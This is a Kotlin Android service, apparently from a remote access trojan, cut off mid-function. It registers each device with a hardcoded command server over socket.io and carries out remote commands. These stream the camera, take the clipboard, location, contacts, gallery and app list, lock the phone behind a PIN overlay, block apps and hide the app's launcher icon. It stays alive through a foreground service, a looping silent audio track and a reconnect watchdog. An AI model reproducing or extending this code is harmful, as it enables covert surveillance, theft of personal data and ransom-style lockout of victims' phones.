package com.xyz.mod.app

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaPlayer
import android.app.WallpaperManager
import android.app.usage.UsageStatsManager
import android.speech.tts.TextToSpeech
import java.util.Locale
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.xyz.mod.app.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.xyz.mod.app.CONNECT"
        const val ACTION_SEND_STATUS   = "com.xyz.mod.app.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.xyz.mod.app.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SEND_SMS      = "com.xyz.mod.app.SEND_SMS"
        const val EXTRA_SMS_JSON       = "smsJson"

        const val ACTION_SCREEN_CAPTURE_RESULT = "com.xyz.mod.app.SCREEN_CAPTURE_RESULT"
        const val EXTRA_SCREEN_RESULT_CODE     = "screen_result_code"
        const val EXTRA_SCREEN_RESULT_DATA     = "screen_result_data"

        const val SERVER_URL = "http://zalryuichi.panelkuy.my.id:2010"
        const val CHANNEL_ID = "xyz_mod_service"
        const val NOTIF_ID   = 1

        const val PREFS_NAME      = "xyz_mod_prefs"
        const val PREF_LOCK_PIN   = "lock_pin"
        const val PREF_LOCK_TITLE = "lock_title"
        const val PREF_IS_LOCKED  = "is_locked"
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry
    private var socket: Socket? = null
    private val socketWatchdogHandler = Handler(Looper.getMainLooper())
    private val socketWatchdogRunnable = object : Runnable {
        override fun run() {
            if (socket == null || socket?.connected() == false) {
                Log.d("DeviceService", "Watchdog: reconnecting socket...")
                try { socket?.disconnect(); socket?.off() } catch (_: Exception) {}
                socket = null
                connectSocket()
                // connectSocket akan reschedule watchdog, stop sini
            } else {
                socketWatchdogHandler.postDelayed(this, 5000)
            }
        }
    }
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L
    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    private var silentPlayer: MediaPlayer? = null
    private var lockOverlayManager: WindowManager? = null
    private var lockOverlayView: android.view.View? = null
    private var lockPin: String = ""
    private var isDeviceLocked: Boolean = false
    private var floatingVideoPlayer: MediaPlayer? = null
    private var floatingSurfaceView: SurfaceView? = null
    private var floatingWindowManager: WindowManager? = null
    private var floatingView: SurfaceView? = null
    private var videoFloating = false
    private var audioPlayer: MediaPlayer? = null
    private var tts: TextToSpeech? = null
    private var textOverlayView: android.view.View? = null
    private var textOverlayWm: WindowManager? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private val blockedApps = mutableSetOf<String>()
    private var blockAllApps = false

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                XyzAccessibilityService.ACTION_ACCESSIBILITY_READY -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                    val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    if (prefs.getBoolean(PREF_IS_LOCKED, false)) {
                        val pin   = prefs.getString(PREF_LOCK_PIN, "") ?: ""
                        val title = prefs.getString(PREF_LOCK_TITLE, "Perangkat Dikunci") ?: "Perangkat Dikunci"
                        if (pin.isNotEmpty()) applyLockOverlay(title, pin)
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK
            if (hasCamera) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId   = getOrCreateBuildId()
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(XyzAccessibilityService.ACTION_ACCESSIBILITY_READY)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        startSilentAudio()
        restoreLockIfNeeded()
        loadBlockedApps()
    }

    private fun getOrCreateBuildId(): String {
        val buildId = Build.ID.ifBlank {
            val fp = Build.FINGERPRINT
            val hash = Math.abs(fp.hashCode())
            "${"${hash % 900 + 100}"}.${"${hash / 900 % 900 + 100}"}.${"${hash / 810000 % 900 + 100}"}"
        }
        return buildId
    }

    private fun buildDeviceInfo(): JSONObject {
        val obj = JSONObject()

        obj.put("sdk", Build.VERSION.SDK_INT)

        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = bm.isCharging
        obj.put("battery", level)
        obj.put("charging", isCharging)

        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val simState = tm.simState
            val simOp = if (simState == android.telephony.TelephonyManager.SIM_STATE_READY)
                tm.networkOperatorName.ifBlank { "Unknown" }
            else "No SIM"
            obj.put("sim", simOp)
        } catch (_: Exception) {
            obj.put("sim", "Unknown")
        }

        return obj
    }

    private fun persistLock(title: String, pin: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().apply {
            putBoolean(PREF_IS_LOCKED, true)
            putString(PREF_LOCK_PIN, pin)
            putString(PREF_LOCK_TITLE, title)
            apply()
        }
    }

    private fun clearLockPrefs() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().apply {
            putBoolean(PREF_IS_LOCKED, false)
            remove(PREF_LOCK_PIN)
            remove(PREF_LOCK_TITLE)
            apply()
        }
    }

    private fun restoreLockIfNeeded() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        if (prefs.getBoolean("protection_enabled", false)) {
            XyzAccessibilityService.protectionEnabled = true
        }

        if (!prefs.getBoolean(PREF_IS_LOCKED, false)) return
        val pin   = prefs.getString(PREF_LOCK_PIN, "") ?: ""
        val title = prefs.getString(PREF_LOCK_TITLE, "Perangkat Dikunci") ?: "Perangkat Dikunci"
        if (pin.isEmpty()) return

        if (XyzAccessibilityService.instance != null) {
            applyLockOverlay(title, pin)
        }
        else {
            Log.d("DeviceService", "restoreLock: menunggu accessibility service ready via broadcast...")
        }
    }

    private fun startSilentAudio() {
        try {
            silentPlayer = MediaPlayer().apply {
                val afd = assets.openFd("silent.mp3")
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(0f, 0f)
                prepare()
                start()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("info", buildDeviceInfo())
                })
                val handler = Handler(Looper.getMainLooper())
                val infoRunnable = object : Runnable {
                    override fun run() {
                        if (socket?.connected() == true) {
                            socket?.emit("device:info", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("info", buildDeviceInfo())
                            })
                        }
                        handler.postDelayed(this, 30_000)
                    }
                }
                handler.postDelayed(infoRunnable, 30_000)
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
            // Mulai watchdog reconnect
            socketWatchdogHandler.removeCallbacks(socketWatchdogRunnable)
            socketWatchdogHandler.postDelayed(socketWatchdogRunnable, 5000)
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
            // Retry setelah 5 detik kalau gagal connect
            socketWatchdogHandler.postDelayed(socketWatchdogRunnable, 5000)
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "flashlight"   -> setFlashlight(value == "true")
            "camera"       -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "playVideo"    -> if (value.isNotEmpty()) startFloatingVideo(value) else stopFloatingVideo()
            "setWallpaper" -> setWallpaperFromBase64(value)
            "lockDevice"   -> lockDevice(value)
            "unlockDevice" -> unlockDevice()
            "playAudio"    -> playAudioFromUrl(value)
            "stopAudio"    -> stopAudio()
            "vibrate"      -> vibrateDevice(value)
            "tts"          -> speakText(value)
            "openUrl"      -> openUrl(value)
            "screenText"   -> if (value.isNotEmpty()) showScreenText(value) else hideScreenText()
            "protection"   -> setProtection(value == "true")
            "spamDialog"   -> setSpamDialog(value == "true")
            "sos"          -> setSos(value == "true")
            "getClipboard" -> sendClipboard()
            "scanWifi"     -> sendWifiList()
            "getWebLog"    -> sendWebLog()
            "getLocation"  -> sendLocation()
            "getAppList"   -> sendAppList()
            "getContacts"  -> sendContactList()
            "getGallery"   -> sendGalleryList()
            "blockApp"     -> blockApp(value)
            "unblockApp"   -> unblockApp(value)
            "blockAll"     -> setBlockAll(value == "true")
            "hideApp"      -> hideApp(value == "true")
            "openApp"      -> openApp(value)
        }
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun startFloatingVideo(videoUrl: String) {
        if (videoFloating) stopFloatingVideo()
        if (!Settings.canDrawOverlays(this)) {
            emitStatus(JSONObject().apply { put("videoError", "no_overlay_perm") })
            return
        }
        if (videoUrl.isEmpty()) return

        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = false)

                val sv = SurfaceView(this)
                floatingView = sv
                XyzAccessibilityService.addOverlay(sv, params)

                sv.holder.addCallback(object : SurfaceHolder.Callback {
                    override fun surfaceCreated(h: SurfaceHolder) {
                        try {
                            floatingVideoPlayer = MediaPlayer().apply {
                                if (videoUrl == "assets") {
                                    val afd = assets.openFd("video.mp4")
                                    setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                                    afd.close()
                                } else {
                                    val fullUrl = "$SERVER_URL$videoUrl"
                                    setDataSource(this@DeviceService, Uri.parse(fullUrl))
                                }
                                setSurface(h.surface)
                                isLooping = true
                                prepareAsync()
                                setOnPreparedListener { start() }
                                setOnErrorListener { _, what, extra ->
                                    Log.e("DeviceService", "Video error what=$what extra=$extra")
                                    emitStatus(JSONObject().apply { put("videoError", "playback_failed") })
                                    true
                                }
                            }
                            videoFloating = true
                            emitStatus(JSONObject().apply { put("videoPlaying", true) })
                        } catch (e: Exception) {
                            Log.e("DeviceService", "startFloatingVideo: ${e.message}")
                            emitStatus(JSONObject().apply { put("videoError", "playback_failed") })
                        }
                    }
                    override fun surfaceChanged(h: SurfaceHolder, f: Int, w: Int, ht: Int) {}
                    override fun surfaceDestroyed(h: SurfaceHolder) {}
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "startFloatingVideo window: ${e.message}")
            }
        }
    }

    private fun stopFloatingVideo() {
        Handler(Looper.getMainLooper()).post {
            try {
                floatingVideoPlayer?.stop()
                floatingVideoPlayer?.release()
                floatingVideoPlayer = null
            } catch (_: Exception) {}
            try {
                floatingView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            floatingView = null
            floatingWindowManager = null
            videoFloating = false
            emitStatus(JSONObject().apply { put("videoPlaying", false) })
        }
    }

    private fun setWallpaperFromBase64(b64: String) {
        Thread {
            try {
                if (checkSelfPermission(android.Manifest.permission.SET_WALLPAPER)
                    != PackageManager.PERMISSION_GRANTED) {
                    emitStatus(JSONObject().apply { put("wallpaperError", "no_permission") })
                    return@Thread
                }

                val bytes = Base64.decode(b64, Base64.DEFAULT)

                // Cek dimensi dulu tanpa decode penuh
                val boundsOpts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                BitmapFactory.decodeByteArray(bytes, 0, bytes.size, boundsOpts)

                val wm = WallpaperManager.getInstance(this)
                val desiredW = wm.desiredMinimumWidth.let { if (it <= 0) 1080 else it }
                val desiredH = wm.desiredMinimumHeight.let { if (it <= 0) 1920 else it }

                // Hitung inSampleSize biar tidak OOM kalau gambar resolusi tinggi
                var sampleSize = 1
                var w = boundsOpts.outWidth
                var h = boundsOpts.outHeight
                while (w / 2 >= desiredW && h / 2 >= desiredH) {
                    sampleSize *= 2
                    w /= 2
                    h /= 2
                }

                val decodeOpts = BitmapFactory.Options().apply {
                    inSampleSize = sampleSize
                    inPreferredConfig = Bitmap.Config.ARGB_8888
                }
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size, decodeOpts)
                    ?: run {
                        emitStatus(JSONObject().apply { put("wallpaperError", "decode_failed") })
                        return@Thread
                    }

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bitmap, null, true,
                            WallpaperManager.FLAG_SYSTEM or WallpaperManager.FLAG_LOCK)
                    } else {
                        @Suppress("DEPRECATION")
                        wm.setBitmap(bitmap)
                    }
                    emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                } finally {
                    bitmap.recycle()
                }

            } catch (e: SecurityException) {
                Log.e("DeviceService", "setWallpaper permission: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperError", "no_permission") })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperError", e.message ?: "failed") })
            }
        }.start()
    }

    private fun lockDevice(valueJson: String) {
        if (isDeviceLocked) return
        if (!Settings.canDrawOverlays(this)) {
            emitStatus(JSONObject().apply { put("lockError", "no_overlay_perm") })
            return
        }
        val title: String
        val pin: String
        try {
            val obj = JSONObject(valueJson)
            title   = obj.optString("title", "Perangkat Dikunci")
            pin     = obj.optString("pin", "")
            if (pin.isEmpty()) return
            lockPin = pin
        } catch (_: Exception) { return }

        persistLock(title, pin)
        applyLockOverlay(title, pin)
    }

    private fun applyLockOverlay(title: String, pin: String) {
        lockPin = pin
        Handler(Looper.getMainLooper()).post {
            try {
                if (isDeviceLocked && lockOverlayView != null) return@post // sudah aktif
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    addJavascriptInterface(object : Any() {
                        @android.webkit.JavascriptInterface
                        fun tryUnlock(enteredPin: String): Boolean {
                            return if (enteredPin == lockPin) {
                                Handler(Looper.getMainLooper()).post { unlockDevice() }
                                true
                            } else false
                        }
                    }, "Android")
                    loadDataWithBaseURL(null, buildLockHtml(title), "text/html", "UTF-8", null)
                }

                lockOverlayView = wv
                XyzAccessibilityService.addOverlay(wv, params)
                isDeviceLocked = true
                // Aktifkan guard navigasi setelah overlay terpasang (delay biar WebView sempat render)
                Handler(Looper.getMainLooper()).postDelayed({
                    XyzAccessibilityService.overlayReady = true
                }, 800)
                emitStatus(JSONObject().apply { put("locked", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "applyLockOverlay: ${e.message}")
            }
        }
    }

    private fun unlockDevice() {
        Handler(Looper.getMainLooper()).post {
            try {
                lockOverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            XyzAccessibilityService.overlayReady = false
            lockOverlayView    = null
            lockOverlayManager = null
            lockPin            = ""
            isDeviceLocked     = false
            clearLockPrefs()
            emitStatus(JSONObject().apply { put("locked", false) })
        }
    }

    private fun setMaxVolume() {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        try { am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0) } catch (_: Exception) {}
        try { am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0) } catch (_: Exception) {}
        try { am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0) } catch (_: Exception) {}
    }

    private fun playAudioFromUrl(url: String) {
        if (url.isEmpty()) return
        Handler(Looper.getMainLooper()).post {
            try {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                setMaxVolume()

                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)

                audioPlayer?.stop()
                audioPlayer?.release()
                audioPlayer = null

                val fullUrl = if (url.startsWith("http")) url else "$SERVER_URL$url"

                audioPlayer = MediaPlayer().apply {
                    setWakeMode(this@DeviceService, PowerManager.PARTIAL_WAKE_LOCK)
                    setAudioAttributes(
                        android.media.AudioAttributes.Builder()
                            .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_MUSIC)
                            .build()
                    )
                    setDataSource(this@DeviceService, Uri.parse(fullUrl))
                    setOnPreparedListener { mp ->
                        setMaxVolume()
                        mp.start()
                        Log.d("DeviceService", "playAudio started: $fullUrl")
                        emitStatus(JSONObject().apply { put("audioPlaying", true) })
                    }
                    setOnCompletionListener {
                        emitStatus(JSONObject().apply { put("audioPlaying", false) })
                    }
                    setOnErrorListener { _, what, extra ->
                        Log.e("DeviceService", "playAudio error: what=$what extra=$extra url=$fullUrl")
                        emitStatus(JSONObject().apply { put("audioPlaying", false) })
                        true
                    }
                    prepareAsync()
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "playAudio exception: ${e.message}")
                emitStatus(JSONObject().apply { put("audioPlaying", false) })
            }
        }
    }

    private fun stopAudio() {
        try { audioPlayer?.stop(); audioPlayer?.release(); audioPlayer = null } catch (_: Exception) {}
        emitStatus(JSONObject().apply { put("audioPlaying", false) })
    }

    private fun vibrateDevice(value: String) {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (getSystemService(VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(VIBRATOR_SERVICE) as Vibrator
        }
        try {
            val obj = org.json.JSONObject(value)
            val type = obj.optString("type", "single")
            val duration = obj.optLong("duration", 500)
            val pattern: LongArray = when (type) {
                "double" -> longArrayOf(0, duration, 200, duration)
                "sos"    -> longArrayOf(0,100,100,100,100,100,100,300,100,300,100,300,100,100,100,100,100,100)
                else     -> longArrayOf(0, duration)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, -1)
            }
        } catch (_: Exception) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(500)
            }
        }
    }

    private fun openApp(pkg: String) {
        if (pkg.isEmpty()) return
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage(pkg)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                emitStatus(JSONObject().apply { put("openApp", pkg) })
            } else {
                emitStatus(JSONObject().apply { put("openAppError", "app_not_found") })
                Log.e("DeviceService", "openApp: package not found $pkg")
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "openApp: ${e.message}")
            emitStatus(JSONObject().apply { put("openAppError", e.message ?: "failed") })
        }
    }

    private fun hideApp(hide: Boolean) {
        try {
            val component = ComponentName(this, MainActivity::class.java)
            val newState = if (hide) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            packageManager.setComponentEnabledSetting(
                component,
                newState,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("appHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "hideApp: ${e.message}")
        }
    }

    private fun speakText(text: String) {
        if (text.isEmpty()) return
        Handler(Looper.getMainLooper()).post {
            try {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                setMaxVolume()
                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)

                tts?.shutdown()
                tts = TextToSpeech(this@DeviceService) { status ->
                    Handler(Looper.getMainLooper()).post {
                        try {
                            if (status != TextToSpeech.SUCCESS) {
                                Log.e("DeviceService", "TTS init failed: $status")
                                return@post
                            }
                            val engine = tts ?: return@post
                            setMaxVolume()
                            val localeId = Locale("id", "ID")
                            val langResult = engine.setLanguage(localeId)
                            if (langResult == TextToSpeech.LANG_MISSING_DATA ||
                                langResult == TextToSpeech.LANG_NOT_SUPPORTED) {
                                engine.setLanguage(Locale.ENGLISH)
                            }
                            val params = android.os.Bundle()
                            params.putInt(TextToSpeech.Engine.KEY_PARAM_STREAM, AudioManager.STREAM_MUSIC)
                            val result = engine.speak(text, TextToSpeech.QUEUE_FLUSH, params, "tts_utterance")
                            Log.d("DeviceService", "TTS speak result: $result, text: $text")
                        } catch (e: Exception) {
                            Log.e("DeviceService", "TTS speak error: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "speakText: ${e.message}")
            }
        }
    }

    private fun openUrl(url: String) {
        if (url.isEmpty()) return
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl: ${e.message}")
        }
    }

    // ── Screen Text Overlay ───────────────────────────────────────────────────
    private fun showScreenText(text: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                hideScreenText()

                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                textOverlayWm = wm

                // Container: lebar penuh, tinggi wrap content, posisi tengah vertikal
                val container = android.widget.FrameLayout(this).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                }

                // Pill background + teks
                val tv = android.widget.TextView(this).apply {
                    this.text = text
                    textSize = 22f
                    setTextColor(android.graphics.Color.WHITE)
                    typeface = android.graphics.Typeface.DEFAULT_BOLD
                    setPadding(64, 28, 64, 28)
                    gravity = android.view.Gravity.CENTER
                    maxLines = 3
                    ellipsize = android.text.TextUtils.TruncateAt.END
                    background = android.graphics.drawable.GradientDrawable().apply {
                        setColor(android.graphics.Color.argb(210, 0, 0, 0))
                        cornerRadius = 16f * resources.displayMetrics.density
                    }
                }

                val lp = android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                    android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = android.view.Gravity.CENTER
                    // Lebar minimal 80% layar
                    width = (resources.displayMetrics.widthPixels * 0.85f).toInt()
                }
                container.addView(tv, lp)

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = android.view.Gravity.CENTER
                }

                wm.addView(container, params)
                textOverlayView = container
                emitStatus(JSONObject().apply { put("screenText", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "showScreenText: ${e.message}")
            }
        }
    }

    private fun hideScreenText() {
        Handler(Looper.getMainLooper()).post {
            try {
                textOverlayView?.let { textOverlayWm?.removeView(it) }
            } catch (_: Exception) {}
